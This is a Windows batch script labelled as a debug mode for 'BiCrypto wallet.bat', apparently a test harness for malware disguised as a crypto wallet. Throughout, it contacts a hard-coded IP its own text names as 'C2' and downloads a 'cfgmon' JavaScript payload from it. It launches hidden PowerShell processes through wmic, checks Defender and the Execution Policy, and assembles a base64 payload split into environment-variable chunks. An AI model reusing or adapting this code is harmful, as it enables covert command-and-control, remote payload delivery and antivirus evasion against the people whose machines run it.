@echo off
title BiCrypto Debug
echo ============================================
echo  BiCrypto wallet.bat DEBUG MODE
echo ============================================
echo.

echo [1] System info:
echo     OS: %OS%
echo     ARCH: %PROCESSOR_ARCHITECTURE%
echo     User: %USERNAME%
echo     Temp: %TEMP%
echo     AppData: %APPDATA%
echo.

echo [2] Checking wmic availability...
wmic os get Caption /value >nul 2>&1
if %errorlevel%==0 (
    echo     wmic: OK
) else (
    echo     wmic: FAILED errorlevel=%errorlevel%
)
echo.

echo [3] Checking PowerShell availability...
powershell -Command "Write-Host '    PS version:' $PSVersionTable.PSVersion" 2>&1
if %errorlevel%==0 (
    echo     PowerShell: OK
) else (
    echo     PowerShell: FAILED errorlevel=%errorlevel%
)
echo.

echo [4] Checking network connectivity to C2...
powershell -Command "try { $r=(New-Object Net.WebClient).DownloadString('http://207.180.245.175:8080/ping'); Write-Host '    /ping response:' $r } catch { Write-Host '    /ping FAILED:' $_.Exception.Message }" 2>&1
echo.

echo [5] Testing cfgmon download...
powershell -Command "try { $f=[IO.Path]::GetTempFileName()+'.js'; (New-Object Net.WebClient).DownloadFile('http://207.180.245.175:8080/cfgmon',$f); $sz=(Get-Item $f).length; Write-Host '    cfgmon downloaded:' $sz 'bytes to' $f; Remove-Item $f -Force } catch { Write-Host '    cfgmon FAILED:' $_.Exception.Message }" 2>&1
echo.

echo [6] Testing wmic process spawn (harmless echo test)...
wmic process call create "powershell -w h -NoP -Command \"[IO.File]::WriteAllText('%TEMP%\\bc_test.txt','wmic_ok')\"" >nul 2>&1
timeout /t 3 /nobreak >nul
if exist "%TEMP%\bc_test.txt" (
    echo     wmic spawn: OK - process was created
    del "%TEMP%\bc_test.txt" >nul 2>&1
) else (
    echo     wmic spawn: FAILED - process did not run
    echo     Trying direct PowerShell instead...
    powershell -w h -NoP -Command "[IO.File]::WriteAllText('%TEMP%\bc_test2.txt','ps_ok')" >nul 2>&1
    if exist "%TEMP%\bc_test2.txt" (
        echo     Direct PS spawn: OK
        del "%TEMP%\bc_test2.txt" >nul 2>&1
    ) else (
        echo     Direct PS spawn: ALSO FAILED
    )
)
echo.

echo [7] Checking Execution Policy...
powershell -Command "Write-Host '    Policy:' (Get-ExecutionPolicy)" 2>&1
echo.

echo [8] Checking AV/Defender status...
powershell -Command "try { $d=Get-MpComputerStatus -ErrorAction Stop; Write-Host '    Defender RealTime:' $d.RealTimeProtectionEnabled } catch { Write-Host '    Defender check failed (may not be running)' }" 2>&1
echo.

echo [9] Checking if base64 payload runs...
set _e00=JABmAD0AWwBJAE8ALgBQAGEAdABoAF0AOgA6AEcAZQB0AFQAZQ
set _e01=BtAHAARgBpAGwAZQBOAGEAbQBlACgAKQArACcALgBqAHMAJwA7
set _exc=%_e00%%_e01%
echo     First 2 chunks assembled: OK (len=%_exc:~0,10%...)
set _exc=&set _e00=&set _e01=
echo     Env cleanup: OK
echo.

echo ============================================
echo  DEBUG COMPLETE - copy and send output above
echo ============================================
echo.
pause
